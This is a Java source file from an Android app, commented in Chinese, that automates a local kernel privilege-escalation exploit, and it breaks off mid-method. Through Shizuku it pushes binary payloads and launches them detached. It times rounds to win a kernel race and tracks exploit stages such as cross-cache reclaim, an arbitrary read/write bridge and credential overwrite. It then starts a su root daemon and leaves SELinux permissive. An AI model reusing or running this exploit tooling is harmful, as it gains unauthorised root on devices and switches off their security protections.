package com.zt.localroot;

import android.content.Context;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.security.MessageDigest;

/**
 * 一键提权流程（PC 端 zt_oneclick.ps1 的等价移植），
 * 传输层从 adb 换成 Shizuku（sh 进程以 uid 2000 运行）。
 */
public class Engine {
    public static final int L_NORM = 0, L_OK = 1, L_WARN = 2, L_ERR = 3, L_CMD = 4, L_HDR = 5;

    public interface Ui {
        void log(String s, int level);

        void stage(String s);

        void progress(int round, int max);

        void finished(boolean ok, String msg);

        /** 确认 uid=0 后回调（用于自动拉起 KernelSU 管理器）。 */
        void onRootReady();

        /** 跑 exploit 期间禁止 App 落盘（落盘会 spawn cat 进程打扰内核竞态）。 */
        void holdDiskLog(boolean on);
    }

    public static final String TMP = ShizukuShell.TMP;
    public static final String KERNEL_EXPECT = "6.6.127";
    /** exploit 输出直接写内部存储根目录，重启也不丢，文件管理器能直接看。 */
    /** 每次运行独立的日志文件（带月日-时分），不会被下次顶掉。 */
    private String runLog = TMP + "/zt-run.log";
    private String runLogMirror = "/sdcard/zt-run.log";

    private static final int R_OK = 0, R_CHP = 1, R_ABORT = 2, R_TIMEOUT = 3, R_DEAD = 4, R_CANCEL = 5, R_HANG = 6;

    private static final String[] PAYLOADS = {"zt_run", "zt_su", "zt_fanout.zte", "zt_su.zte"};
    private static final int[] MODES = {0755, 0755, 0644, 0644};
    private static final String[] ALL_FILES = {"zt_run", "zt_su", "zt_fanout.zte", "zt_su.zte"};
    private static final int[] ALL_MODES = {0755, 0755, 0644, 0644};
    /** 每次运行内容都会变的小文件，必须每轮重推（不能靠大小判断）。 */
    private static final String[] SMALL_FILES = {"zt_cmds.txt", "zt_start.sh"};
    /** exploit 阶段顺序，用来判断这一轮打到哪一步。 */
    private static final String[] STAGES = {"LANE_DONE", "RCU_FORCE", "STAGE0_DIRTY_ARM", "SPRAY_DONE",
            "SLAB_DRAIN_PASS", "BOOTID_WRITE_PASS", "STAGE0_GATE_PASS", "CROSSCACHE_ALLOC",
            "CROSSCACHE_CPU_GATE", "KS_COLLISIONS", "CROSSCACHE_KS", "BRIDGE_PAYLOAD",
            "CROSSCACHE_RECLAIM", "PIPE_CARRIER_PREPARED", "FAKE_ORDER1_MULTI",
            "MISC_BRIDGE_STAGE_BEGIN", "BRIDGE_OPEN_OK", "BRIDGE_VERIFY_FAIL",
            "MISC_BRIDGE_RW_PASS", "PHYS_WRITE_PASS", "STAGE8_CRED_RENEW_PASS", "ROOT_SHELL_READY"};
    private static final String[] SHA256 = {
            "376d8fa69d1eb6b0cda9e95f36bc3131c0d99b0a01d7594d28a32f40a39a7f02",
            "8cc31cc4fc36a3f5215216f39a2e152256f50c17ef8896deb196ee26001b786a",
            "50ffe8f0d84e18c05b497ecfb8ffdde1f6843c51a7683e5738d827263f311bef",
            "d2dd5702b5e27dcc4bd18c104c7734d58ff872a301fb0b2e9b9e4f3f51d258b9"
    };

    private final Context ctx;
    private final Ui ui;
    private volatile boolean cancelled;
    private boolean resume;
    private boolean hintedBridge;
    private boolean hintedRw;
    private String selinuxBefore = "";
    private int maxRounds = 20;
    private int roundTimeout = 480;

    public Engine(Context c, Ui u) {
        ctx = c;
        ui = u;
    }

    public void cancel() {
        cancelled = true;
    }

    public void start() {
        Thread t = new Thread(new Runnable() {
            public void run() {
                try {
                    execute();
                } catch (Throwable e) {
                    ui.log("[X] 内部异常: " + e, L_ERR);
                    ui.finished(false, String.valueOf(e.getMessage()));
                } finally {
                    restoreSelinux();
                }
            }
        }, "zt-engine");
        t.setDaemon(true);
        t.start();
    }

    /** 接上次没跑完的进度（App 被杀 / 切后台 / 软重启后回来）。 */
    public void resume() {
        resume = true;
        start();
    }

    // ---------------------------------------------------------------- helpers

    private static String trim(String s) {
        if (s == null) {
            return "";
        }
        return s.replace("\r", "").trim();
    }

    private String sh(String cmd) {
        return sh(cmd, 60000);
    }

    private String sh(String cmd, long timeoutMs) {
        return trim(ShizukuShell.run(timeoutMs, cmd));
    }

    private boolean hasSu() {
        for (String f : new String[]{"su -c id", "su 0 id"}) {
            if (sh(f, 20000).contains("uid=0")) {
                return true;
            }
        }
        return false;
    }

    private boolean grepCount(String needle) {
        String r = sh("grep -c " + needle + " " + runLog + " 2>/dev/null", 20000);
        r = r.replaceAll("[^0-9].*$", "");
        try {
            return r.length() > 0 && Integer.parseInt(r) > 0;
        } catch (NumberFormatException e) {
            return false;
        }
    }

    private String runAsRoot(String cmd) {
        return sh("printf '" + cmd + "\\nexit\\n' | " + TMP + "/zt_su", 40000);
    }

    private String exploitPid() {
        String o = trim(sh("pidof zt_run 2>/dev/null", 20000));
        for (String t : o.split("\\s+")) {
            try {
                if (Long.parseLong(t) > 0) {
                    return t;
                }
            } catch (NumberFormatException ignored) {
            }
        }
        return "";
    }

    /** 失败后统一判定：报阶段、查系统健康、太深就停。返回 true 表示已收尾，不该继续。 */
    private boolean abortIfDirty() {
        String log = readRunLog();
        String stage = stageOf(log);
        if (stage.length() > 0) {
            ui.log("  本轮到达阶段: " + stage, L_WARN);
        }
        if (!systemHealthy()) {
            ui.log("[X] 系统已经不稳定：连 /system/bin/sh 都起不来（fork 报 EAGAIN）", L_ERR);
            ui.log("    现在开任何 App 都会闪退，只能重启手机", L_ERR);
            ui.finished(false, "系统已不稳定，必须重启");
            return true;
        }
        int miss = 0;
        try {
            miss = Integer.parseInt(trim(sh("grep -c ATTEMPT_MISS " + runLog + " 2>/dev/null", 20000)));
        } catch (Throwable ignored) {
        }
        if (miss >= 16 && stageRank(stage) < stageRank("STAGE0_GATE_PASS")) {
            ui.log("[!] 本轮连续 " + miss + " 次 ATTEMPT_MISS 且没摸到 STAGE0 → 止损", L_WARN);
            ui.log("    换一个干净的 boot 再打：重启手机 → 重开 Shizuku → 再点一键", L_WARN);
            ui.finished(false, "连续 MISS，需重启");
            return true;
        }
        if (stageRank(stage) >= stageRank("STAGE0_GATE_PASS")) {
            if (stage.contains("BRIDGE_VERIFY_FAIL")) {
                ui.log("[i] 已推到任意读桥，errno=25 属正常中间态（作者成功那次也失败 2 次）", L_NORM);
            }
            if (stageRank(stage) >= stageRank("CROSSCACHE_RECLAIM")) {
                ui.log("[★] 跨缓存回收已打通 —— 这是目前最深的一步，差最后一口气", L_OK);
            }
            ui.log("[i] 本轮已改内核状态，但作者脚本同样是同一开机连打，继续下一轮", L_NORM);
        }
        return false;
    }

    private String stageOf(String log) {
        String best = "";
        for (String st : STAGES) {
            if (log.contains(st)) {
                best = st;
            }
        }
        return best;
    }

    private int stageRank(String stage) {
        for (int i = 0; i < STAGES.length; i++) {
            if (STAGES[i].equals(stage)) {
                return i;
            }
        }
        return -1;
    }

    /** fork 都能失败说明系统已经被打脏了。 */
    private boolean systemHealthy() {
        String r = ShizukuShell.run(8000, "echo ok");
        return r != null && r.contains("ok");
    }

    private String readRunLog() {
        return sh("tail -c 4096 " + runLog + " 2>/dev/null", 20000);
    }

    /** 用 cat 逐字节拷贝：cp 在这种环境下会走 copy_file_range，产出「大小对、内容全 0」的假副本。 */
    private void mirrorRunLog() {
        String r = sh("cat " + runLog + " > " + runLogMirror + ".tmp 2>/dev/null; "
                + "a=$(wc -c < " + runLog + " 2>/dev/null); "
                + "b=$(wc -c < " + runLogMirror + ".tmp 2>/dev/null); "
                + "n=$(tr -d \"\\000\" < " + runLogMirror + ".tmp 2>/dev/null | wc -c); "
                + "if [ \"$a\" = \"$b\" ] && [ \"$n\" -gt 0 ]; then mv -f " + runLogMirror + ".tmp " + runLogMirror + "; "
                + "chmod 666 " + runLogMirror + " 2>/dev/null; echo MIRROR_OK=$b; "
                + "elif [ \"$a\" = \"$b\" ]; then rm -f " + runLogMirror + ".tmp; echo MIRROR_ZERO; "
                + "else echo MIRROR_BAD=$a/$b; fi", 25000);
        if (r.contains("MIRROR_BAD")) {
            ui.log("  [!] 日志副本写入异常: " + r, L_WARN);
        } else if (r.contains("MIRROR_ZERO")) {
            ui.log("  [!] 日志副本内容全 0（大小对但数据没写进去），已丢弃", L_WARN);
        }
    }

    private void logRunLogTail(String content) {
        String[] ls = content.split("\n");
        int from = Math.max(0, ls.length - 6);
        for (int i = from; i < ls.length; i++) {
            String t = ls[i].trim();
            if (t.length() > 0) {
                ui.log("    | " + t, L_NORM);
            }
        }
    }

    private boolean pref(String k, boolean def) {
        try {
            return ctx.getSharedPreferences("zt", Context.MODE_PRIVATE).getBoolean(k, def);
        } catch (Throwable t) {
            return def;
        }
    }

    private boolean screenOff() {
        String s = sh("dumpsys power 2>/dev/null | grep -m1 'mWakefulness='", 20000);
        return s.contains("Asleep") || s.contains("Dozing");
    }

    /** 熄屏后系统更安静，竞态命中率更高（原作者脚本同样要求等熄屏）。 */
    private void waitScreenOff(int maxSec) {
        if (screenOff()) {
            ui.log("  [✓] 屏幕已熄灭", L_OK);
            return;
        }
        if (pref("auto_screen_off", true)) {
            ui.log("  [i] 自动熄屏中…", L_NORM);
            ShizukuShell.run(1200, "sleep 1");
            for (int i = 0; i < 3; i++) {
                sh("input keyevent 26 2>/dev/null", 15000);
                ShizukuShell.run(1600, "sleep 1.5");
                if (screenOff()) {
                    ui.log("  [✓] 已自动熄屏", L_OK);
                    return;
                }
                ui.log("    自动熄屏未生效，重试 " + (i + 1) + "/3", L_WARN);
            }
        } else {
            ui.log("  [i] 设置里关闭了自动熄屏，请手动按电源键", L_WARN);
        }
        ui.log("  [i] 请按电源键熄屏（最多等 " + maxSec + " 秒，App 在后台继续跑）", L_WARN);
        for (int t = 0; t < maxSec; t += 3) {
            if (cancelled) {
                return;
            }
            ShizukuShell.run(3200, "sleep 3");
            if (screenOff()) {
                ui.log("  [✓] 已熄屏，开始执行", L_OK);
                return;
            }
            if (t % 15 == 0) {
                ui.log("    等待熄屏… " + t + "s", L_NORM);
            }
        }
        ui.log("  [!] 没等到熄屏，按当前状态继续（命中率可能偏低）", L_WARN);
    }

    private void logTemp() {
        try {
            double c = maxTempC();
            if (c < 0) {
                ui.log("  [i] 温度读取失败", L_NORM);
                return;
            }
            ui.log(String.format("  [i] CPU/GPU 最高温 %.1f℃（≤45℃ 属正常）", c), L_NORM);
            if (c > 45 && pref("temp_warn", true)) {
                ui.log("  [!] 温度偏高，命中率会明显下降；建议降温后再跑", L_WARN);
            }
        } catch (Throwable t) {
            ui.log("  [i] 温度读取失败", L_NORM);
        }
    }

    /**
     * 只统计 CPU/GPU 类传感器（cpu* / cpuss* / aoss* / gpuss* / socd*）。
     * 这台机器有 95 个 zone，其中 vbat、ibat、pmih010x_lite_tz 之类不是温度，
     * 直接取全局最大值会误报（之前就被 58737 顶出过"高温"假警）。
     */
    private double maxTempC() {
        String cmd = "for z in /sys/class/thermal/thermal_zone*; do "
                + "t=$(cat $z/type 2>/dev/null); v=$(cat $z/temp 2>/dev/null); "
                + "case \"$t\" in *cpu*|*cpuss*|*aoss*|*gpuss*|*socd*|*gpu*) echo \"$v\";; esac; done "
                + "| sort -n | tail -1";
        String raw = trim(sh(cmd, 25000));
        try {
            double v = Double.parseDouble(raw);
            if (v > 1000) {
                v = v / 1000.0;
            }
            if (v <= 0 || v > 150) {
                return -1;
            }
            return v;
        } catch (Throwable t) {
            return -1;
        }
    }

    /** 等后台负载收敛（load1 <= 3），最多 maxSec 秒。 */
    /** CPU 真实压力（PSI some avg10，百分比）；读不到返回 -1。 */
    private double cpuPressure() {
        String s = trim(sh("cat /proc/pressure/cpu 2>/dev/null | head -1", 15000));
        int i = s.indexOf("avg10=");
        if (i < 0) {
            return -1;
        }
        int j = s.indexOf(' ', i);
        try {
            return Double.parseDouble(s.substring(i + 6, j < 0 ? s.length() : j));
        } catch (Throwable t) {
            return -1;
        }
    }

    private void waitIdle(int maxSec) {
        for (int t = 0; t < maxSec && !cancelled; t += 5) {
            String l = trim(sh("cut -d' ' -f1 /proc/loadavg 2>/dev/null", 15000));
            double psi = cpuPressure();
            double v;
            try {
                v = Double.parseDouble(l);
            } catch (Throwable e) {
                v = 0;
            }
            if (psi >= 0) {
                if (psi <= 20) {
                    ui.log(String.format("  [✓] CPU 压力正常（avg10=%.1f%%，load1=%s）", psi, l), L_OK);
                    return;
                }
                if (t % 20 == 0) {
                    ui.log(String.format("  [i] CPU 有压力 avg10=%.1f%%（>20%% 算忙），最多等 %d 秒…", psi, maxSec), L_WARN);
                }
                ShizukuShell.run(5200, "sleep 5");
                continue;
            }
            if (v <= 6.0) {
                ui.log("  [✓] 后台已收敛（load1=" + l + "）", L_OK);
                return;
            }
            if (t == 0) {
                double vv = 0;
                try {
                    vv = Double.parseDouble(l);
                } catch (Throwable ignored) {
                }
                if (vv > 10) {
                    ui.log("  [!] load1=" + l + " 太高了，这样跑基本是白跑；建议重启手机后再点一键", L_ERR);
                }
            }
            if (t % 20 == 0) {
                ui.log("  [i] 后台还忙（load1=" + l + "），最多等 120 秒…", L_WARN);
            }
            ShizukuShell.run(5200, "sleep 5");
        }
        ui.log("  [!] 负载没降下来，按当前状态继续", L_WARN);
    }

    /** 等温度降到 maxC 以下，最多 maxSec 秒。 */
    private void waitCool(int maxC, int maxSec) {
        for (int t = 0; t < maxSec && !cancelled; t += 5) {
            double c = maxTempC();
            if (c < 0 || c <= maxC) {
                return;
            }
            if (t == 0) {
                ui.log(String.format("  [i] 温度 %.1f℃ 偏高，等降到 %d℃ 以下…", c, maxC), L_WARN);
            }
            ShizukuShell.run(5200, "sleep 5");
        }
    }

    private void logLoad() {
        String l = trim(sh("cut -d' ' -f1 /proc/loadavg 2>/dev/null", 15000));
        double psi = cpuPressure();
        if (psi >= 0) {
            ui.log(String.format("  [i] CPU 压力 avg10=%.1f%% · load1=%s（仅参考，不再等待）", psi, l), L_NORM);
        } else {
            ui.log("  [i] load1=" + l + "（仅参考，不再等待）", L_NORM);
        }
    }

    /** 载荷已完整在设备上就不用重推（作者实测成功那轮正是"没有重推"）。 */
    private boolean payloadsReady(File dir) {
        StringBuilder sb = new StringBuilder("wc -c");
        for (String n : ALL_FILES) {
            sb.append(" ").append(TMP).append("/").append(n);
        }
        String out = sh(sb.toString() + " 2>/dev/null", 20000);
        return verifySizes(out, dir);
    }

    private boolean isExploitAlive() {
        return exploitPid().length() > 0;
    }

    /** setsid 分离启动：App 或 Shizuku 死掉，exploit 仍然继续跑。 */
    private boolean startExploitDetached() {
        String pre = sh("ls " + TMP + "/zt_run " + TMP + "/zt_cmds.txt 2>&1", 20000);
        if (!pre.contains("zt_run") || !pre.contains("zt_cmds.txt")) {
            ui.log("  [X] 前置文件缺失: " + pre.replace("\n", " | "), L_ERR);
            return false;
        }
        String cmd = "cd " + TMP + " && rm -f " + runLog + " " + TMP + "/zt_state && "
                + "setsid /system/bin/sh " + TMP + "/zt_start.sh >/dev/null 2>&1 </dev/null & "
                + "sleep 3; echo STARTED";
        String out = sh(cmd, 40000);
        String state = "";
        for (int i = 0; i < 6; i++) {
            state = sh("cat " + TMP + "/zt_state 2>/dev/null", 15000);
            if (state.contains("PID=") || state.contains("EXIT=")) {
                break;
            }
            ShizukuShell.run(1500, "sleep 1");
        }
        String pid = field(state, "PID");
        String early = readRunLog();
        if (early.length() > 0) {
            ui.log("  [i] zt_run 已输出 " + early.length() + " 字节：", L_NORM);
            logRunLogTail(early);
            mirrorRunLog();
        }
        if (state.contains("EXIT=")) {
            int code = toInt(field(state, "EXIT"));
            ui.log("  [!] zt_run 已结束 " + exitCode(state) + explain(code) + "（日志 " + runLog + "）", L_WARN);
            return false;
        }
        if (state.contains("PID=")) {
            ui.log("  [detached] " + state.replace("\n", " ") + "（日志 " + runLog + "，副本 " + runLogMirror + "）", L_CMD);
            return true;
        }
        if (pid.length() > 0) {
            ui.log("  [detached] pid=" + pid + "（日志 " + runLog + "，副本 " + runLogMirror + "）", L_CMD);
            return true;
        }
        if (!ShizukuShell.alive()) {
            ui.log("  [X] 启动瞬间 Shizuku 断开 —— 设备大概率已经重启（exploit 触发了内核崩溃）", L_ERR);
            return false;
        }
        if (early.length() > 0) {
            ui.log("  [!] zt_run 启动后很快退出（不是没起来），上面的输出就是它跑过的证据", L_WARN);
            return false;
        }
        String rl = trim(sh("ls -l " + runLog + " 2>&1", 15000));
        ui.log("  [X] zt_run 没有任何输出: " + (out.length() > 0 ? out : "(无输出)") + " | " + rl, L_ERR);
        ui.log("    当前日志路径: " + runLog, L_CMD);
        ui.log("    启动脚本: " + trim(sh("cat " + TMP + "/zt_start.sh 2>&1", 15000)), L_CMD);
        ui.log("    tmp 现有日志: " + trim(sh("ls -l " + TMP + "/zt-run-*.log 2>&1 | tail -4", 15000)), L_CMD);
        ui.log("    zt_run: " + trim(sh("ls -l " + TMP + "/zt_run 2>&1; " + TMP + "/zt_run --help 2>&1 | head -2", 20000)), L_CMD);
        return false;
    }

    private void killExploit() {
        String st = sh("cat " + TMP + "/zt_state 2>/dev/null", 15000);
        String zp = field(st, "PID");
        StringBuilder c = new StringBuilder("true");
        if (zp.length() > 0) {
            c.append("; kill -9 ").append(zp).append(" 2>/dev/null");
        }
        c.append("; pkill -9 -x zt_run 2>/dev/null; pkill -9 -x zt_fanout 2>/dev/null; "
                + "pkill -9 -x zt_su 2>/dev/null; pkill -9 -x zt_kha 2>/dev/null; "
                + "pkill -9 -f 'zt_run --run' 2>/dev/null; true");
        sh(c.toString(), 20000);
    }

    private static String field(String s, String key) {
        if (s == null) {
            return "";
        }
        for (String line : s.split("\n")) {
            String t = line.trim();
            if (t.startsWith(key + "=")) {
                return t.substring(key.length() + 1).trim();
            }
        }
        return "";
    }

    private static int toInt(String s) {
        try {
            return Integer.parseInt(s.trim());
        } catch (Throwable t) {
            return -1;
        }
    }

    private static String exitCode(String state) {
        String v = field(state, "EXIT");
        return "EXIT=" + (v.length() > 0 ? v : "?");
    }

    private static String explain(int code) {
        if (code == 0) {
            return "（正常结束，但没拿到 root）";
        }
        if (code == 137) {
            return "（SIGKILL：被系统 OOM 或我们杀掉）";
        }
        if (code == 139) {
            return "（SIGSEGV 段错误：payload 自己崩了）";
        }
        if (code == 143) {
            return "（SIGTERM：被 App 主动终止）";
        }
        if (code == 134) {
            return "（SIGABRT）";
        }
        if (code == 9) {
            return "（payload 自适应重试用尽，主动退出并已还原内核状态）";
        }
        if (code == 1) {
            return "（payload 主动放弃：多半是载荷与设备轮廓不匹配）";
        }
        return "";
    }

    private int pollResult(int round) {
        return pollResult(round, roundTimeout);
    }

    private static int num(String s, String key) {
        try {
            int i = s.indexOf(key + "=");
            if (i < 0) {
                return -1;
            }
            int j = i + key.length() + 1;
            int k = j;
            while (k < s.length() && Character.isDigit(s.charAt(k))) {
                k++;
            }
            return Integer.parseInt(s.substring(j, k));
        } catch (Throwable t) {
            return -1;
        }
    }

    /** 一次 shell 调用干完所有事（统计+tail+sleep），同时做心跳与死锁检测。 */
    private int pollResult(int round, int timeoutSec) {
        long t0 = System.currentTimeMillis();
        String lastTail = "";
        long lastSize = -1, lastGrow = t0;
        long deadline = t0 + timeoutSec * 1000L;
        int strikes = 0, beat = 0, ext = 0;
        ui.holdDiskLog(true);
        ui.log("  [静默] 前 40 秒完全不碰设备：不起 shell、不落盘、不读日志", L_NORM);
        for (int q = 0; q < 2; q++) {
            try {
                Thread.sleep(20000);
            } catch (InterruptedException e) {
                ui.holdDiskLog(false);
                return R_CANCEL;
            }
            if (cancelled) {
                ui.holdDiskLog(false);
                return R_CANCEL;
            }
            ui.log("  … 静默等待 " + ((q + 1) * 20) + "s / 40s", L_CMD);
        }
        try {
        while (!cancelled) {
            String out = sh("taskset -p 1 $$ >/dev/null 2>&1; echo S=$(wc -c < " + runLog + " 2>/dev/null); "
                    + "echo R1=$(grep -c ROOT_SHELL_READY " + runLog + " 2>/dev/null); "
                    + "echo R2=$(grep -c ROOT_CHILD_HOLD_PASS " + runLog + " 2>/dev/null); "
                    + "echo R3=$(grep -c IQBIND_ABORT " + runLog + " 2>/dev/null); "
                    + "echo P=$(pidof zt_run zt_fanout 2>/dev/null); "
                    + "echo E=$(grep -o 'EXIT=[0-9]*' " + TMP + "/zt_state 2>/dev/null | tail -1); sleep 60; "
                    + "echo ===; tail -c 1500 " + runLog + " 2>/dev/null", 30000);
            if (!ShizukuShell.alive()) {
                return R_DEAD;
            }
            long now = System.currentTimeMillis();
            long el = (now - t0) / 1000L;
            if (out.length() == 0) {
                strikes++;
                ui.log("  [!] 设备侧 " + el + "s 内没返回（shell 调用超时，第 " + strikes + "/3 次）", L_WARN);
                if (strikes >= 3) {
                    ui.log("  连续 3 次调不动 shell —— 内核已被 exploit 卡住，本轮强制结束", L_ERR);
                    return R_HANG;
                }
                continue;
            }
            strikes = 0;
            if (num(out, "R1") > 0) {
                ui.log("  ★ 第 " + round + " 轮提权成功（root 会话已 hold 住）", L_OK);
                return R_OK;
            }
            if (num(out, "R2") > 0) {
                ui.log("  ★ exploit 已拿到 root（ROOT_CHILD_HOLD_PASS）", L_WARN);
                ui.log("    但命令文件未被消费 ⇒ root 通道可能没自动起来", L_WARN);
                return R_CHP;
            }
            if (num(out, "R3") > 0) {
                ui.log("[X] 设备侧校验未通过（IQBIND_ABORT）", L_ERR);
                return R_ABORT;
            }
            int sep = out.indexOf("===");
            String tail = sep >= 0 ? out.substring(sep + 3) : out;
            if (tail.trim().length() > 0 && !tail.equals(lastTail)) {
                lastTail = tail;
                logRunLogTail(tail);
                if (tail.contains("BRIDGE_VERIFY_FAIL") && !hintedBridge) {
                    hintedBridge = true;
                    ui.log("  [i] BRIDGE_VERIFY_FAIL(errno=25) 是正常中间态：作者成功那次也失败了 2 次才过，继续等", L_NORM);
                }
                if (tail.contains("MISC_BRIDGE_RW_PASS") && !hintedRw) {
                    hintedRw = true;
                    ui.log("  ★★ 任意读写桥已打通（MISC_BRIDGE_RW_PASS）—— 接下来就是物理写和拿 root", L_OK);
                }
            }
            long size = num(out, "S");
            if (size > lastSize) {
                lastSize = size;
                lastGrow = now;
            }
            long stall = (now - lastGrow) / 1000L;
            String st = stageOf(out);
            int pidv = num(out, "P");
            if (++beat % 2 == 0) {
                if (stall > 60) {
                    ui.log("     （payload 在重试/等待回收，作者原脚本每轮给它 480 秒，继续等）", L_NORM);
                }
                ui.log("  … 第 " + round + " 轮 t=" + el + "s｜日志 " + size + "B｜停滞 " + stall + "s"
                        + "｜pid=" + (pidv > 0 ? String.valueOf(pidv) : "改名/无")
                        + (st.length() > 0 ? "｜阶段 " + st : ""), L_CMD);
            }
            long stallLimit = stageRank(st) >= stageRank("CROSSCACHE_RECLAIM") ? 600 : 420;
            if (stall > stallLimit) {
                ui.log("  日志 " + stall + "s 没有任何新增 ⇒ 判定卡死"
                        + (st.length() > 0 ? "（停在 " + st + "）" : ""), L_ERR);
                return R_HANG;
            }
            if (now > deadline) {
                if (now - lastGrow < 120000L && ext < 3) {
                    ext++;
                    deadline = now + 180000L;
                    ui.log("  最近 2 分钟还在出东西 ⇒ 本轮再延长 180 秒（第 " + ext + "/3 次）", L_NORM);
                } else {
                    return R_TIMEOUT;
                }
            }
            String endMark = field(out, "E");
            if (endMark.startsWith("EXIT=")) {
                int code = toInt(endMark.substring(5));
                ui.log("  exploit 自己结束了 " + endMark + explain(code) + "（上一行就是它停的地方）", L_WARN);
                String stNow = stageOf(out);
                if (code == 1 && (stNow.length() == 0 || stageRank(stNow) <= stageRank("LANE_DONE"))) {
                    ui.log("  [!] 停在 LANE_DONE + EXIT=1：竞态已经打中，但载荷跟这台设备不匹配", L_ERR);
                    ui.log("      常见原因：内核 build 号不是 abogki543627741，或内存是 12G 版（要换 6-12g 载荷）", L_ERR);
                    ui.log("      请把 uname -r 的结果发出来核对", L_WARN);
                }
                return R_DEAD;
            }
        }
        } finally {
            ui.holdDiskLog(false);
        }
        return R_CANCEL;
    }

    /** 漏洞可能把 SELinux 改成宽容模式，收尾时能恢复就恢复。 */
    private void restoreSelinux() {
        try {
            String after = trim(sh("getenforce 2>/dev/null", 15000));
            if (after.length() == 0) {
                return;
            }
            if (!"Permissive".equalsIgnoreCase(after)) {
                return;
            }
            ui.log("[!] SELinux 现在是 Permissive（宽容模式）—— 系统防护是关的", L_WARN);
            if (rootChannelAlive()) {
                // zt_su 守护跑在 u:r:shell:s0，一旦切回 Enforcing，uid=0 也会被 SELinux 拦，
                // root 通道随即失效。作者脚本也是等 KernelSU 接管后才恢复。
                ui.log("    当前 root 通道仍在使用中，先保持 Permissive（切回 Enforcing 会让 su 失效）", L_WARN);
                ui.log("    重启手机后会自动回到 Enforcing；或装好 KernelSU 后再手动 setenforce 1", L_WARN);
            } else {
                ui.log("    当前没有 root 通道可用；重启手机即可回到 Enforcing", L_WARN);
            }
        } catch (Throwable ignored) {
        }
    }

    private boolean rootChannelAlive() {
        return runAsRoot("id").contains("uid=0");
    }

    public static String sha256(File f) {
        try {
            MessageDigest md = MessageDigest.getInstance("SHA-256");
            InputStream in = new java.io.FileInputStream(f);
            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) > 0) {
                md.update(buf, 0, n);
            }
            in.close();
            StringBuilder sb = new StringBuilder();
            for (byte b : md.digest()) {
                sb.append(String.format("%02x", b));
            }
            return sb.toString();
        } catch (Exception e) {
            return "ERR";
        }
    }

    /** 释放 assets 载荷到私有目录并校验哈希（App 写、Shizuku 读不到，所以只做校验用）。 */
    public File preparePayload() {
        try {
            File dir = new File(ctx.getFilesDir(), "payload");
            if (!dir.exists() && !dir.mkdirs()) {
                return null;
            }
            for (int i = 0; i < PAYLOADS.length; i++) {
                File out = new File(dir, PAYLOADS[i]);
                boolean need = !out.exists() || out.length() == 0 || !sha256(out).equals(SHA256[i]);
                if (need) {
                    InputStream in = ctx.getAssets().open(PAYLOADS[i]);
                    OutputStream os = new FileOutputStream(out);
                    byte[] buf = new byte[65536];
                    int n;
                    while ((n = in.read(buf)) > 0) {
                        os.write(buf, 0, n);
                    }
                    os.close();
                    in.close();
                }
                if (!sha256(out).equals(SHA256[i])) {
                    ui.log("[X] 载荷校验失败: " + PAYLOADS[i], L_ERR);
                    return null;
                }
            }
            File ksu = new File(dir, "zt_ksu.sh");
            InputStream kin = ctx.getAssets().open("zt_ksu.sh");
            OutputStream kos = new FileOutputStream(ksu);
            byte[] kbuf = new byte[8192];
            int kn;
            while ((kn = kin.read(kbuf)) > 0) {
                kos.write(kbuf, 0, kn);
            }
            kos.close();
            kin.close();
            return dir;
        } catch (Exception e) {
            ui.log("[X] 释放载荷失败: " + e, L_ERR);
            return null;
        }
    }

    private static boolean copyFile(File src, File dst) {
        try {
            if (dst.exists() && dst.length() == src.length()) {
                return true;
            }
            FileInputStream in = new FileInputStream(src);
            FileOutputStream out = new FileOutputStream(dst);
            byte[] buf = new byte[65536];
            int n;
            while ((n = in.read(buf)) > 0) {
                out.write(buf, 0, n);
            }
            out.close();
            in.close();
            return dst.length() == src.length();
        } catch (Exception e) {
            return false;
        }
    }

    /** wc -c 输出逐行解析：按 basename 精确比对（不能用 contains，zt_su 会撞 zt_su.zte）。 */
    private boolean verifySizes(String wcOut, File dir) {
        for (String name : ALL_FILES) {
            long want = new File(dir, name).length();
            boolean ok = false;
            for (String line : wcOut.split("\n")) {
                String[] tok = line.trim().split("\\s+");
                if (tok.length < 2) {
                    continue;
                }
                String path = tok[1];
                int slash = path.lastIndexOf('/');
                String base = slash >= 0 ? path.substring(slash + 1) : path;
                if (!base.equals(name)) {
                    continue;
                }
                try {
                    ok = Long.parseLong(tok[0]) == want;
                } catch (NumberFormatException ignored) {
                }
                break;
            }
            if (!ok) {
                ui.log("[!] 大小不对: " + name + " 期望 " + want, L_WARN);
                return false;
            }
        }
        return true;
    }

    /** 生成喂给 zt_run 的命令流（必须有：zt_run --run < zt_cmds.txt）。 */
    private void writeCmds(File dir) throws Exception {
        OutputStream os = new FileOutputStream(new File(dir, "zt_cmds.txt"));
        os.write((TMP + "/zt_su --daemon\nsleep 6\nid\necho ROOT_SHELL_READY\nsleep 3600\n").getBytes("UTF-8"));
        os.close();
        OutputStream st = new FileOutputStream(new File(dir, "zt_start.sh"));
        boolean turbo = pref("env_turbo", false);
        String sh = "#!/system/bin/sh\n"
                + "cd " + TMP + "\n"
                + (turbo ? "export KHDUMP=1 NEO11_DOUBLE_SPRAY=1 KHONESHOT=1\n" : "")
                + "echo \"BEGIN=$(date +%s)\" > " + TMP + "/zt_state\n"
                + "./zt_run --run < " + TMP + "/zt_cmds.txt >> " + runLog + " 2>&1 &\n"
                + "ZP=$!\n"
                + "echo \"PID=$ZP\" >> " + TMP + "/zt_state\n"
                + "wait $ZP\n"
                + "C=$?\n"
                + "echo \"EXIT=$C END=$(date +%s)\" >> " + TMP + "/zt_state\n"
                + "echo \"EXIT=$C\" >> " + runLog + "\n";
        st.write(sh.getBytes("UTF-8"));
        st.close();
    }

    /** zt_cmds.txt / zt_start.sh 每次内容都变，每轮必须重推。 */
    private boolean pushSmall(File dir) {
        StringBuilder serr = new StringBuilder();
        for (String n : SMALL_FILES) {
            int mode = n.endsWith(".sh") ? 0755 : 0644;
            if (!ShizukuShell.push(new File(dir, n), TMP + "/" + n, mode, serr)) {
                ui.log("[X] 小文件下发失败: " + n + " " + serr, L_ERR);
                return false;
            }
        }
        return true;
    }

    /** 优先「外部目录 + shell cp」（含 zt_cmds.txt），失败再退回管道。 */
    private boolean pushAll(File dir) {
        try {
            writeCmds(dir);
        } catch (Exception e) {
            ui.log("[X] 生成 zt_cmds.txt 失败: " + e, L_ERR);
            return false;
        }
        File ext = null;
        try {
            ext = ctx.getExternalFilesDir(null);
        } catch (Throwable ignored) {
        }
        if (ext != null) {
            File sd = new File(ext, "p");
            if (sd.exists() || sd.mkdirs()) {
                boolean staged = true;
                for (String n : ALL_FILES) {
